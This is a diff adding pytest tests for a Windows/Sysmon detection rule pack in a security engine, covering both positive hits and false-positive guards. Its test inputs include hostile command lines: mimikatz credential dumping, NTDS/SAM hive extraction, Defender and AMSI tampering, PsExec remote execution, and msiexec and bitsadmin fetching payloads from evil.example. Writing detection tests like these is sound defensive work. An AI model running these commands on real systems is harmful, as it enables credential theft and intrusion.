@@ -369,3 +369,162 @@ def test_alert_from_match_builds_row():
     assert a["src_ip"] == "45.83.122.7" and a["user_name"] == "CORP\\jdoe"
     assert a["dedup_hash"] == "abc123" and a["batch_id"] == 7
     assert len(a["message"]) == 1000          # truncated for storage
+
+
+# ── Phase 2: Windows / Sysmon high-fidelity endpoint pack ────────────────────
+def test_engine_fires_phase2_endpoint_rules():
+    """Each Phase 2 rule fires on its positive indicator (fields carried in raw,
+    as the Sysmon / Windows-Security parsers surface them)."""
+    eng = DetectionEngine(load_rules(RULES_DIR))
+
+    def hits(**kw):
+        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}
+
+    def sm(log_type="process-create", **fields):
+        return dict(vendor="microsoft", product="sysmon", log_type=log_type,
+                    action=log_type, raw=fields)
+
+    # 1 LSASS memory access (EID10) — sensitive mask, non-benign source
+    assert "lo-sysmon-lsass-memory-access" in hits(
+        **sm("process-access", TargetImage=r"C:\Windows\System32\lsass.exe",
+             GrantedAccess="0x1410", SourceImage=r"C:\Temp\evil.exe"))
+    # 2 credential-dumper tool — by image, by original filename, by argument
+    assert "lo-sysmon-credential-dumper-tools" in hits(**sm(Image=r"C:\Temp\m.exe",
+                                                            OriginalFileName="mimikatz.exe"))
+    assert "lo-sysmon-credential-dumper-tools" in hits(
+        **sm(Image=r"C:\a\b.exe", CommandLine="b.exe sekurlsa::logonpasswords"))
+    # 3 NTDS / SAM extraction
+    assert "lo-sysmon-ntds-sam-extraction" in hits(
+        **sm(CommandLine=r'ntdsutil "ac i ntds" "create full C:\temp" q q'))
+    assert "lo-sysmon-ntds-sam-extraction" in hits(
+        **sm(CommandLine=r"reg save hklm\sam C:\temp\sam.hive"))
+    # 4 remote thread into a sensitive process (EID8)
+    assert "lo-sysmon-remote-thread-injection" in hits(
+        **sm("create-remote-thread", TargetImage=r"C:\Windows\System32\lsass.exe",
+             SourceImage=r"C:\Users\p\AppData\Local\Temp\x.exe"))
+    # 5 BYOVD vulnerable driver load (EID6)
+    assert "lo-sysmon-byovd-driver-load" in hits(
+        **sm("driver-load", ImageLoaded=r"C:\Windows\Temp\RTCore64.sys"))
+    # 6 UAC bypass registry hijack (EID13)
+    assert "lo-sysmon-uac-bypass-registry" in hits(
+        **sm("registry-set",
+             TargetObject=r"HKU\S-1-5-21\Software\Classes\ms-settings\Shell\Open\command\(Default)"))
+    # 7 LSA / AppInit / Winlogon-Notify persistence
+    assert "lo-sysmon-lsa-appinit-persistence" in hits(
+        **sm("registry-set",
+             TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages"))
+    # 8 WDigest UseLogonCredential enabled
+    assert "lo-sysmon-wdigest-uselogoncredential" in hits(
+        **sm("registry-set",
+             TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",
+             Details="DWORD (0x00000001)"))
+    # 9 Defender disabled (registry and PowerShell paths)
+    assert "lo-sysmon-defender-disable" in hits(
+        **sm("registry-set",
+             TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring"))
+    assert "lo-sysmon-defender-disable" in hits(
+        **sm(CommandLine="powershell Set-MpPreference -DisableRealtimeMonitoring $true"))
+    # 10 AMSI / ETW tampering
+    assert "lo-sysmon-amsi-etw-tamper" in hits(
+        **sm(CommandLine="powershell [Ref].Assembly.GetType('...AmsiUtils') AmsiScanBuffer patch"))
+    # 11 PsExec / remote service exec
+    assert "lo-sysmon-psexec-service-exec" in hits(**sm(Image=r"C:\Windows\PSEXESVC.exe"))
+    assert "lo-sysmon-psexec-service-exec" in hits(
+        **sm(CommandLine=r"psexec \\FIN-DC01 -accepteula -s cmd.exe"))
+    # 12 msiexec installing a remote package
+    assert "lo-sysmon-msiexec-remote-package" in hits(
+        **sm(Image=r"C:\Windows\System32\msiexec.exe",
+             CommandLine="msiexec /i https://evil.example/x.msi /quiet"))
+    # 13 BITS transfer
+    assert "lo-sysmon-bits-transfer" in hits(
+        **sm(CommandLine="bitsadmin /transfer job http://evil.example/a.exe C:\\a.exe"))
+    # 14 Cobalt Strike default named pipe (EID17)
+    assert "lo-sysmon-c2-named-pipe" in hits(**sm("pipe-create", PipeName=r"\msagent_a1"))
+    # 15 local account created (Windows Security 4720)
+    assert "lo-win-local-account-created" in hits(
+        vendor="microsoft", log_type="security", action="user-created")
+
+
+def test_phase2_benign_endpoint_activity_stays_quiet():
+    """Benign endpoint activity that superficially resembles the indicators must
+    NOT trip the Phase 2 rules (false-positive guards)."""
+    eng = DetectionEngine(load_rules(RULES_DIR))
+
+    def hits(**kw):
+        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}
+
+    def sm(log_type="process-create", **fields):
+        return dict(vendor="microsoft", product="sysmon", log_type=log_type,
+                    action=log_type, raw=fields)
+
+    def phase2(ids):
+        return {i for i in ids if i in {
+            "lo-sysmon-lsass-memory-access", "lo-sysmon-credential-dumper-tools",
+            "lo-sysmon-ntds-sam-extraction", "lo-sysmon-remote-thread-injection",
+            "lo-sysmon-byovd-driver-load", "lo-sysmon-uac-bypass-registry",
+            "lo-sysmon-lsa-appinit-persistence", "lo-sysmon-wdigest-uselogoncredential",
+            "lo-sysmon-defender-disable", "lo-sysmon-amsi-etw-tamper",
+            "lo-sysmon-psexec-service-exec", "lo-sysmon-msiexec-remote-package",
+            "lo-sysmon-bits-transfer", "lo-sysmon-c2-named-pipe",
+            "lo-win-local-account-created"}}
+
+    # Defender itself reading LSASS is on the benign-source exclusion list
+    assert not phase2(hits(**sm("process-access",
+                                TargetImage=r"C:\Windows\System32\lsass.exe",
+                                GrantedAccess="0x1410",
+                                SourceImage=r"C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe")))
+    # local msiexec install (no remote source) does not fire the remote-package rule
+    assert not phase2(hits(**sm(Image=r"C:\Windows\System32\msiexec.exe",
+                                CommandLine=r"msiexec /i C:\pkgs\app.msi /quiet")))
+    # a legitimate GPU driver load is not a BYOVD hit
+    assert not phase2(hits(**sm("driver-load", ImageLoaded=r"C:\Windows\System32\drivers\nvlddmkm.sys")))
+    # Chrome's mojo IPC pipe is not a Cobalt Strike pipe
+    assert not phase2(hits(**sm("pipe-create", PipeName=r"\mojo.7890.12345.9876543210")))
+    # reading (not saving) a hive is not extraction
+    assert not phase2(hits(**sm(CommandLine=r"reg query hklm\sam")))
+    # WDigest key set back to 0 is not the credential-caching enable
+    assert not phase2(hits(**sm("registry-set",
+                                TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",
+                                Details="DWORD (0x00000000)")))
+    # a plain interactive logon is not account creation
+    assert not phase2(hits(vendor="microsoft", log_type="security", action="logon"))
+    # an everyday process create trips none of the pack
+    assert not phase2(hits(**sm(Image=r"C:\Windows\System32\notepad.exe",
+                                ParentImage=r"C:\Windows\explorer.exe",
+                                CommandLine="notepad C:\\Users\\p\\notes.txt")))
+
+
+def test_sysmon_parser_surfaces_eid_fields_for_phase2_rules():
+    """End-to-end: a rendered-Message Get-WinEvent JSON export (the shape analysts
+    actually produce) flows through the Sysmon parser and lights up the EID 10 / 6
+    rules — proving the lifted SourceImage/TargetImage/GrantedAccess/ImageLoaded
+    fields resolve, not only synthetic EventData."""
+    import json
+
+    from app.parsers.sysmon import parse as sysmon_parse
+
+    eng = DetectionEngine(load_rules(RULES_DIR))
+
+    def fired(content):
+        ids = set()
+        for evt in sysmon_parse(content):
+            ids |= {r.id for r in eng.evaluate_event(evt)}
+        return ids
+
+    eid10 = json.dumps({
+        "Id": 10, "MachineName": "FIN-WS-014",
+        "Message": "Process accessed:\r\nUtcTime: 2026-01-02 10:11:12.345\r\n"
+                   "SourceImage: C:\\Users\\p\\AppData\\Local\\Temp\\evil.exe\r\n"
+                   "SourceProcessId: 4242\r\n"
+                   "TargetImage: C:\\Windows\\System32\\lsass.exe\r\n"
+                   "GrantedAccess: 0x1410\r\n"
+                   "CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c534|UNKNOWN(...)\r\n"})
+    assert "lo-sysmon-lsass-memory-access" in fired(eid10)
+
+    eid6 = json.dumps({
+        "Id": 6, "MachineName": "FIN-WS-014",
+        "Message": "Driver loaded:\r\nUtcTime: 2026-01-02 10:15:00.000\r\n"
+                   "ImageLoaded: C:\\Windows\\Temp\\RTCore64.sys\r\n"
+                   "Signed: true\r\nSignature: MICRO-STAR INTERNATIONAL\r\n"
+                   "SignatureStatus: Valid\r\n"})
+    assert "lo-sysmon-byovd-driver-load" in fired(eid6)
